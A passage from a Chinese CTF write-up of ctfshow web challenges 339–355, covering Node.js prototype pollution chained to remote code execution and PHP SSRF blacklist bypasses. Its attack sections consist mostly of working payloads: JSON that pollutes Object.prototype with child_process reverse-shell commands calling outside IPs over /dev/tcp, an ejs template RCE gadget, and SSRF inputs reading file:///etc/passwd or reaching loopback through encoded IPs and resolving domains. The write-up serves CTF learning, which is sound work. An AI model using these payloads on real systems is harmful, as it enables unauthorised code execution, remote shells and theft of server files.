<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">&#123;&quot;username&quot;:&quot;111&quot;,&quot;password&quot;:&quot;111&quot;,&quot;__proto__&quot;: &#123;&quot;ctfshow&quot;: &quot;36dboy&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="web339-变量覆盖-query"><a href="#web339-变量覆盖-query" class="headerlink" title="web339 变量覆盖 query"></a>web339 变量覆盖 query</h3><p>login.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>api.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);  <span class="comment">//函数名 query，参数 query</span></span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>和上一题的区别在于，上一题判断语句是 if(secert.ctfshow&#x3D; &#x3D; &#x3D;‘36dboy’)，这题是 if(secert.ctfshow&#x3D; &#x3D; &#x3D;flag)，但是变量 flag 的值我们不知道，所以不能使用上一题的 payload 污染原型修改 secert.ctfshow。</p>
<p>通过 login.js 里的 utils.copy(user,req.body); 污染原型，然后访问 api 的时候由于 query 未定义，所以会向其原型找，那么通过污染原型构造恶意代码即可 rce。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_64815693/article/details/130076401">ctfshow web入门 nodejs 334-341(更新中)</a></p>
<p>这一题的payload有点难理解，不过研究好可以为后面几题打基础。</p>
<p>① <code>Function(query)</code> 是什么？</p>
<ul>
<li>它是 <strong>函数构造器</strong>，能把一个字符串变成 JS 函数。</li>
<li>举例：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let f = Function(&quot;return 2+3&quot;);</span><br><span class="line">console.log(f()); // 输出 5</span><br></pre></td></tr></table></figure>

<ul>
<li>在题目里：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Function(query)</span><br></pre></td></tr></table></figure>

<p>意思是：把客户端发来的 <code>query</code> 字符串当作函数体，生成一个新的函数。</p>
<hr>
<p>② 后面的 <code>(query)</code> 又是啥？</p>
<ul>
<li>新生成的函数要被调用一次，所以加了 <code>(query)</code>。</li>
<li>由于函数体本身就是 <code>query</code> 字符串，这就相当于：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(query)</span><br></pre></td></tr></table></figure>

<p>也就是说，<strong>客户端传什么，服务器就执行什么</strong>。</p>
<p>res.render(‘api’, { query: … }) 是干嘛的？</p>
<p>res.render 会把第二个参数 { query: … } 传给模板。</p>
<p>模板里可能有：</p>
<p></p>


<p>当模板渲染时，它会去 { query: … } 里找 query，如果没找到，会顺着原型链去找。</p>
<ul>
<li><code>login.js</code> 的 <code>copy</code> 函数可以污染 <strong>Object.prototype</strong>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;恶意代码&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>一旦污染：<ul>
<li>所有对象都能看到这个 <code>query</code> 属性。</li>
<li>当模板访问 <code>query</code> 时，会从原型链上找到我们设置的值。</li>
</ul>
</li>
</ul>
<p>看的有点懵，提一下重点：</p>
<ol>
<li><strong><code>Function(query)(query)</code></strong> 会执行 <code>query</code> 字符串。</li>
<li>模板渲染时用到 <code>query</code> 这个参数。</li>
<li><code>query</code> 来自对象 <code>&#123; query: Function(query)(query) &#125;</code>，如果没有这个属性，它会去 <strong>Object.prototype</strong> 上找。</li>
</ol>
<p>模板渲染需要 <code>query</code> 这个变量。</p>
<p>我们想执行自己的代码，但服务器本身没提供修改 <code>query</code> 的接口。</p>
<p><strong>原型链污染</strong> 就是“旁路”手段：通过发送 JSON 给 <code>copy</code> 函数污染 <code>Object.prototype.query</code>。所有对象在访问 <code>query</code> 时，都会自动拿到我们设置的值</p>
<p>注意这里有两个 <code>query</code>，先给它们起个名字方便区分：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">let f = Function(query);  // 第一个 query</span><br><span class="line">f(query);                  // 第二个 query</span><br></pre></td></tr></table></figure>

<p><strong>第一个 <code>query</code></strong>：<strong>作为函数体的字符串</strong></p>
<ul>
<li>也就是你想让函数执行的“代码”</li>
<li>例如 <code>&quot;return 2+3&quot;</code> 或 <code>&quot;malicious_code()&quot;</code></li>
<li>这个字符串被传给 <code>Function</code>，生成一个函数对象</li>
</ul>
<p><strong>第二个 <code>query</code></strong>：<strong>调用函数时的参数</strong></p>
<ul>
<li>调用新函数的时候，把这个值传进去</li>
<li>服务器内部函数里可以用这个参数</li>
</ul>
<p><strong>第二个 query 会去原型链找</strong></p>
<ul>
<li>当函数体里使用 <code>query</code> 时，JS 会先在局部作用域找这个变量</li>
<li>但是如果对象里没有，JS 就会沿着 <strong>原型链</strong> 找</li>
<li>利用 <code>login.js</code> 的 <code>copy</code> 方法，我们可以污染 <code>Object.prototype.query</code>：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;恶意代码&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这样函数体里使用 <code>query</code> → 没有局部变量 → 去原型链找到 <code>&quot;恶意代码&quot;</code></li>
<li>然后被 <code>Function(query)(query)</code> 执行 → 触发 RCE</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/111780832">CTFSHOW nodejs篇</a></p>
<p>用这个payload成功了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">        &quot;constructor&quot;: &#123;</span><br><span class="line">            &quot;prototype&quot;: &#123;</span><br><span class="line">            &quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/101.34.94.44/4567 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><em>flag在&#x2F;app&#x2F;routes&#x2F;login.js中</em></p>
<p><img src="/../../../../AppData/Roaming/Typora/typora-user-images/image-20250824183428529.png" alt="image-20250824183428529"></p>
<h3 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h3><p>login.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> user = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user.<span class="property">userinfo</span>,req.<span class="property">body</span>);</span><br><span class="line">  <span class="keyword">if</span>(user.<span class="property">userinfo</span>.<span class="property">isAdmin</span>)&#123;</span><br><span class="line">   res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>&#125;);  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>api.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p> 前半部分（<code>isAdmin</code>）</p>
<p>这里主要是 <strong>证明污染成功</strong>。</p>
<ul>
<li>你通过 <code>copy()</code> 把 payload 合并进 <code>user.userinfo</code></li>
<li>然后因为 payload 里面的 <code>__proto__</code> 链会“冒泡”到 <strong>Object.prototype</strong></li>
<li>所以最终 <code>&#123;&#125;</code> 的原型上多了一个属性：<code>isAdmin: &#123;isAdmin:true&#125;</code></li>
</ul>
<p>这个就说明 <strong>任意对象</strong> 都会继承到 <code>isAdmin</code>，系统逻辑就可能被绕过（比如权限验证）。</p>
<p> 后半部分（<code>query</code>）  </p>
<p>前面只是权限绕过，但我们真正想要的是 <strong>RCE 拿 flag</strong>。</p>
<p>有的题目里（比如你遇到的 Node.js CTF 题），代码里会有一段类似这样的逻辑：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var func = new Function(&quot;query&quot;, userInput); </span><br><span class="line">func(query);</span><br></pre></td></tr></table></figure>

<p>也就是说：</p>
<ul>
<li>用户传入的 <code>query</code> 参数，会被当成函数体执行</li>
<li>如果对象的原型链上存在 <code>query</code> 属性，那也会被取到</li>
</ul>
<p>于是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/43.140.251.169/4567 0&gt;&amp;1\&quot;&#x27;)&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>就把 <code>query</code> 属性放到了 <strong>Object.prototype</strong> 上。</p>
<p>这样，当服务器执行 <code>func(query)</code> 的时候：</p>
<ol>
<li>它会去对象里找 <code>query</code></li>
<li>找不到，就顺着原型链找到被污染的 <code>Object.prototype.query</code></li>
<li>于是返回值就变成了我们恶意构造的 <code>return global.process...exec(...)</code></li>
<li>直接执行反弹 shell 命令 → getshell → 读取 flag</li>
</ol>
<p><code>cat routes/login.js|grep flag</code></p>
<h3 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h3><p>下载附件分析代码，发现这题没有<code>api.js</code>了，而且<code>login.js</code>也没有地方污染</p>
<p><a target="_blank" rel="noopener" href="https://oss.waynejoons.icu/picphoto/20250813223720736.png"><img src="https://oss.waynejoons.icu/picphoto/20250813223720736.png" alt="img"></a></p>
<p>继续分析代码，在<code>app.js</code>可以看到包含了ejs，且引擎设置为ejs</p>
<p><a target="_blank" rel="noopener" href="https://oss.waynejoons.icu/picphoto/20250813224859620.png"><img src="https://oss.waynejoons.icu/picphoto/20250813224859620.png" alt="img"></a></p>
<p><a target="_blank" rel="noopener" href="https://oss.waynejoons.icu/picphoto/20250813232421761.png"><img src="https://oss.waynejoons.icu/picphoto/20250813232421761.png" alt="img"></a></p>
<p><strong>ejs模板引擎</strong>有个漏洞可以利用，实现<strong>从原型链污染到RCE</strong></p>
<p>参考文章：<a target="_blank" rel="noopener" href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">Express+lodash+ejs: 从原型链污染到RCE</a></p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/你的VPS地址/端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>跟上题一样，也是在<code>/login</code>里POST写入，然后<strong>刷新一次页面</strong>即</p>
<h3 id="web342"><a href="#web342" class="headerlink" title="web342"></a>web342</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">app.engine(&#x27;jade&#x27;, require(&#x27;jade&#x27;).__express); </span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;jade&#x27;);</span><br></pre></td></tr></table></figure>





<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h3 id="web351"><a href="#web351" class="headerlink" title="web351"></a>web351</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>url &#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.0.0.1/flag.php</a><br>url &#x3D; localhost&#x2F;flag.php<br>url &#x3D; 127.0.0.1&#x2F;flag.php</p>
<p>url &#x3D; file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php(在源代码)</p>
<p>尝试 post 传入 url，并使用 file 协议作为参数，file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd 有返回值。 然后猜测 flag 在当前目录，而当前目录一般都是&#x2F;var&#x2F;www&#x2F;html 故传入 file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</p>
<p>两个问题等你写</p>
<p>curl_exec 的特性</p>
<p>本题最后一个 payload 有什么不同，为什么可以绕过本地限制</p>
<p><strong>答案：</strong></p>
<ol>
<li><strong><code>curl_exec</code> 函数的作用及使用场景</strong><br><code>curl_exec</code> 是 PHP cURL 库中用于执行预配置的 cURL 会话的函数。它会发起网络请求（如 HTTP、FTP 等）并获取响应数据。在正常开发中，<code>curl_exec</code> 常用于以下场景：<ul>
<li>调用第三方 API（如支付接口、社交媒体平台）。</li>
<li>爬取网页内容或聚合数据。</li>
<li>下载远程文件（如图片、文档）。</li>
<li>实现服务间通信（如微服务架构中的内部调用）。</li>
</ul>
</li>
<li><strong>前三个 Payload 生效的原因</strong><br>前三个 Payload 利用的是 <strong>SSRF（服务端请求伪造）</strong>，使服务器向自身发起请求：<ul>
<li><code>url=http://127.0.0.1/flag.php</code> 与 <code>url=http://localhost/flag.php</code>：<br><code>127.0.0.1</code> 和 <code>localhost</code> 均指向服务器本地。若 <code>flag.php</code> 部署在服务器的 Web 根目录（如 <code>/var/www/html/</code>）且仅允许本地访问，通过 cURL 请求这些地址可直接读取文件内容。</li>
<li><strong>注意</strong>：若 Payload 中未显式包含协议（如 <code>http://</code>），cURL 可能默认补全或报错，实际测试时需确保 URL 格式正确（如 <code>http://127.0.0.1/flag.php</code>）。</li>
</ul>
</li>
<li><strong><code>file://</code> 协议绕过本地限制的原因</strong><br>Payload <code>url=file:///var/www/html/flag.php</code> 生效的关键点：<ul>
<li><strong>直接文件系统访问</strong>：<code>file://</code> 协议允许 cURL 直接读取服务器本地文件，无需经过 HTTP 服务。若代码未限制协议类型（默认允许所有协议），攻击者可绕过网络层限制（如防火墙、IP 黑名单）。</li>
<li><strong>防御缺失</strong>：若服务器未禁用危险协议（如通过 <code>CURLOPT_PROTOCOLS</code> 限制仅允许 HTTP&#x2F;HTTPS），<code>file://</code> 可被利用读取敏感文件（如 <code>/etc/passwd</code>）。</li>
</ul>
</li>
</ol>
<h3 id="web352"><a href="#web352" class="headerlink" title="web352"></a>web352</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123; </span><br><span class="line">    #仅允许 http:// 或 https:// 协议，阻止 file://、gopher:// 等危险协议</span><br><span class="line">if(! preg_match(&#x27;/localhost|127.0.0/&#x27;))&#123;</span><br><span class="line">    #检测 URL 中是否包含 localhost 或 127.0.0，若匹配则终止并返回 &quot;hacker&quot;。</span><br><span class="line">    #这里的 localhost 和 127.0.0 真的被过滤了吗？preg_match 函数的参数都没给完整，其限制字符就是个幌子</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; hacker</span><br></pre></td></tr></table></figure>


<p><strong>漏洞分析</strong></p>
<ol>
<li><strong>正则表达式缺陷</strong></li>
</ol>
<ul>
<li><strong>范围不完整</strong>：正则仅检测 <code>127.0.0</code>，但未覆盖以下情况：<ul>
<li>IPv4 短格式：<code>http://127.1/</code>（等价于 <code>127.0.0.1</code>）。</li>
<li>十进制 IP：<code>http://2130706433/</code>（对应 <code>127.0.0.1</code>）。</li>
<li><del>IPv6 地址：<code>http://[::1]/</code>（对应 <code>localhost</code>）。</del></li>
</ul>
</li>
<li><del><strong>大小写绕过</strong>：未使用 <code>i</code> 修饰符，<code>LocalHost</code> 或 <code>LOCALHOST</code> 可绕过检测。</del></li>
</ul>
<ol start="2">
<li><strong><code>parse_url</code> 解析绕过</strong></li>
</ol>
<ul>
<li><strong>URL 混淆攻击</strong>：<br>构造 <code>http://evil.com@127.0.0.1/</code>，<code>parse_url</code> 解析的 <code>host</code> 为 <code>evil.com</code>，但实际请求发送到 <code>127.0.0.1</code>。</li>
<li><strong>路径注入</strong>：<br><code>http://example.com/127.0.0.1/flag.php</code>，正则触发误杀合法 URL，但攻击者仍可能利用其他格式。</li>
</ul>
<p><strong>攻击示例</strong></p>
<p>绕过黑名单的 Payload：</p>
<ol>
<li><p><strong>IPv4 短格式</strong></p>
<p>复制</p>
<p>url &#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p>
<ul>
<li>等价于 <code>127.0.0.1</code>，但绕过正则检测。</li>
</ul>
</li>
<li><p><strong>十进制 IP</strong></p>
<p>复制</p>
<p>url &#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a></p>
<ul>
<li>十进制 <code>2130706433</code> 对应 <code>127.0.0.1</code>。</li>
</ul>
</li>
<li><p><del><strong>IPv6 地址</strong></del></p>
<p><del>复制</del></p>
<p>url &#x3D; http:&#x2F;&#x2F;[:: 1]&#x2F;flag.php</p>
<ul>
<li><del>IPv6 的本地回环地址，未被正则覆盖。</del></li>
</ul>
</li>
</ol>
<blockquote>
<p>各种进制的 IP 地址</p>
<p>#默认</p>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.0.0.1</a></p>
<p>#16 进制</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0x7F000001</a></p>
</blockquote>
<blockquote>
<p>#10 进制</p>
</blockquote>
<blockquote>
<p>((127 <em>256+0)</em> 256+0)*256+1&#x2F;&#x2F;计算过程<br><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://2130706433</a></p>
</blockquote>
<blockquote>
<p>#8 进制</p>
</blockquote>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://127.0.0.1/">http://0177.0000.0000.0001</a></p>
</blockquote>
<blockquote>
<p>题目使用 parse_url 对 url 进行解析，需要我们传入协议为 http 或者是 https，同时不可以出现 localhost 或者是 127.0.0 绕过: 使用其余各种指向 127.0.0.1 的地址 &gt;&gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.00000.00000.001/</a> 0 的数量多一点少一点都没影响，最后还是会指向 127.0.0.1 &gt;&gt;&gt;&gt; <a target="_blank" rel="noopener" href="http://127.0.0.1/">http://127.1</a> &gt;&gt;&gt;&gt; 利用进制绕过……………… payload：url &#x3D; <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.00000.00000.001/flag.php</a> 或者 <a target="_blank" rel="noopener" href="http://127.0.0.1/flag.php">http://127.1/flag.php</a></p>
</blockquote>
<blockquote>
<p>前面的解析都没有认真思考</p>
<p>这里的 localhost 和 127.0.0 真的被过滤了吗？</p>
<p>preg_match 函数的参数都没给完整，其限制字符就是个幌子</p>
<p>直接 <code>url=http://localhost/flag.php</code> 照样拿下</p>
</blockquote>
<h3 id="web353"><a href="#web353" class="headerlink" title="web353"></a>web353</h3><p>payload 直接拿上面那题的…</p>
<h3 id="web354"><a href="#web354" class="headerlink" title="web354"></a>web354</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span class="line">$x=parse_url($ url);</span><br><span class="line">if($x[&#x27;scheme&#x27;]===&#x27;http&#x27;||$ x [&#x27;scheme&#x27;]===&#x27;https&#x27;)&#123;</span><br><span class="line">if(! preg_match(&#x27;/localhost|1|0|。/i&#x27;, $url))&#123;</span><br><span class="line">$ch=curl_init($ url);</span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, 0);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($ ch);</span><br><span class="line">curl_close($ch);</span><br><span class="line">echo ($result);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt; hacker</span><br></pre></td></tr></table></figure>





<blockquote>
<p>通过 ip 地址解析为 127.0.0.1 的网站进行绕过</p>
<p><code>url=http://spoofed.burpcollaborator.net/flag.php</code></p>
<p><code>url=http://safe.taobao.com/flag.php</code></p>
<p><code>url=http://sudo.cc/flag.php </code>; A 记录 sudo.cc 指向 IP 地址 127.0.0.1。</p>
</blockquote>
<h3 id="web355"><a href="#web355" class="headerlink" title="web355"></a>web355</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$url=$_POST [&#x27;url&#x27;];</span><br><span 